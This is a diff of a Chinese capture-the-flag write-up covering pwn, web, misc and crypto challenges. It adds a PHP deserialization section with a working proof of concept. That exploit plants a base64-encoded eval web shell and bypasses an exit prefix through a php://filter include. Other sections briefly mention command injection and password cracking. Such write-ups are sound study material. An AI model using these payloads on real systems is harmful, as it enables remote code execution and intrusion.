@@ -1,11 +1,31 @@
 1. [pwn](#pwn)
+    1. [真nc就给flag](#真nc就给flag)
+    2. [nc就给flag](#nc就给flag)
+2. [web](#web)
+    1. [easy_md5](#easy_md5)
+    2. [php_is_the_best_language](#php_is_the_best_language)
+    3. [`[echo] More than just 🐎?`](#echo)
+    4. [重复几次](#重复几次)
+    5. [php_serialize_2](#php_serialize_2)
+    6. [php_serialize_1](#php_serialize_2)
+3. [misc](#misc)
+    1. [Unicode](#Unicode)
+    2. [lsb](#lsb)
+    3. [peekaboo](#peekaboo)
+    4. [re](#re)
+    5. [破解WIFI密码](#破解WIFI密码)
+    6. [miku](#miku)
+4. [crypto](#crypto)
+    1. [凯撒加入了北约](#凯撒加入了北约)
+
+![](./i/12.png)
 # pwn
-1. 真nc就给flag
+## 真nc就给flag
 
     nc pwn.aw31-hack.top 10002
 
 直接nc一下进取，cat/flag.txt就完事了
-2. nc就给flag
+## nc就给flag
 ![](./i/10.png)
 
 比较狗，提示stdout is close，那我们输入一个参数
@@ -15,12 +35,12 @@
 就可以继续获取我们的flag了
 
 # web
-1. easy_md5
+## easy_md5
 ![](./i/1.png)
 
 php的弱比较，找md5前和md5后都是0e开头的，第一个比较是数组不能被md5化
 
-2. php_is_the_best_language
+## php_is_the_best_language
 
 查看源码有提示，传个猴子我是没想到的，套神太强了
 
@@ -39,19 +59,20 @@ for ($i=0;$i < 100000;$i++){
 }
 ?>
 ```
-3. [echo] More than just 🐎?
+## echo
+## [echo] More than just 🐎?
 
 尝试着，再看传参应该是命令注入，已知cmd[]=传入数组会报错，试着试着就出来了，这题真的迷糊，不知道为啥cat /flag不行，估计后台过滤了
 
 ![](./i/3.png)
 
-4. 重复几次
+## 重复几次
 
 太阴了，buu有题，hint提示fl@g和ffffllllaaaagggg被误导了，结果是flag，套神师傅饶了我吧
 
 ![](./i/4.png)
 
-5. php_serialize_2
+## php_serialize_2
 
 一道比较简单的反序列化构造，直接上pop
 ```php
@@ -158,8 +179,116 @@ echo urlencode(serialize($a));
 
 感动，人生第一次做出来ctf比赛的反序列化
 
+## php_serialize_1
+
+
+查看响应头得到 hint： h1nt.php
+
+```php
+<?php
+ini_set("open_basedir", ".");
+error_reporting(0);
+
+class class1
+{
+    public $contents;
+    public $loadFile;
+
+    function __toString()
+    {
+        // TODO: Implement __toString() method.
+        return $this->uploadFile();
+    }
+
+    function uploadFile(): string
+    {
+        if(!is_dir('./upload/')){
+            mkdir('./upload/');
+        }
+        $fileName = "./upload/" . md5($_SERVER['REMOTE_ADDR']) . ".php";
+        file_put_contents($fileName, "<?php echo \"stupid!\";exit();" . $this->contents);
+        if (is_file($fileName)) {
+            $this->loadFile();
+            return "success";
+        } else {
+            return "fail to upload file";
+        }
+
+    }
+
+    function loadFile()
+    {
+        include $this->loadFile;
+    }
+}
+
+class class2
+{
+    public $name;
+    public $age;
+
+    function __construct()
+    {
+        $this->name = "AWSL";
+        $this->age = 4;
+    }
+
+    function __destruct()
+    {
+        // TODO: Implement __destruct() method.
+        echo "We are " . $this->name;
+    }
+}
+
+if (!isset($_REQUEST['AWSL'])) {
+    highlight_file(__FILE__);
+    exit(0);
+
+} else {
+    unserialize($_REQUEST['AWSL']);
+}
+```
+
+确定 REMOTE_ADDR
+
+```system
+curl cip.cc
+```
+
+其实就是确定自身ip地址
+
+进行MD5加密 https://cmd5.com/
+
+确定上传后的文件路径为 ./upload/1559fbe6f86d66fe78a3047c42ccfbdb.php
+
+这里环境有问题，他们未开启arp转发所以地址其实为172.2.0.4
+POC:
+```php
+<?php
+class class1
+{
+    public $contents;
+    public $loadFile;
+}
+
+class class2
+{
+    public $name;
+    public $age;
+}
+
+$o = new class2();
+$o->name = new class1();
+$o->name->contents = "000PD9waHAgZXZhbCgkX1BPU1RbMF0pOyA/Pg==";
+$o->name->loadFile = "php://filter/convert.base64-decode/resource=./upload/1559fbe6f86d66fe78a3047c42ccfbdb.php";
+
+echo serialize($o);
+```
+
+![](./i/11.png)
+
 # Crypto
-1. 凯撒加入了北约
+## 凯撒加入了北约
 看到那么多新生都做出来，亚历山大，看了半天才试出来，先把首字母截取
 
 ```python
@@ -176,27 +305,27 @@ CHARLIEALFAECHOSIERRAALFAROMEOINDIANOVEMBERNOVEMBERALFATANGOOSCAR
 然后全都转换成小写，再认识一下单词，英语不太好，再把所有单词首字母提出来就是flag了
 
 # misc
-1. Unicode
+## Unicode
 
 太阴了，还有隐藏字符，，，，，直接unidecode两次
 
 ![](./i/6.png)
 
-2. lsb
+## lsb
 
 ,查看颜色通道，有个通道上面有牙啃得东西，送分题
 
 ![](./i/7.png)
 
-3. peekaboo
+## peekaboo
 
 首先是密码暴力破解，六位数密码，破解出来后是个world，无法打开，binwalk分离一下，成功获取flag
 
-4. re
+## re
 
 根据题目，先re，然后直接转换图片flag就出来了
 
-5. 破解WIFI密码
+## 破解WIFI密码
 
 破解这个.cap
 
@@ -204,7 +333,7 @@ CHARLIEALFAECHOSIERRAALFAROMEOINDIANOVEMBERNOVEMBERALFATANGOOSCAR
 
 获得密码admin123
 
-6. miku
+## miku
 
 有点类似祥云杯的一道misc，emmm想了好久
 
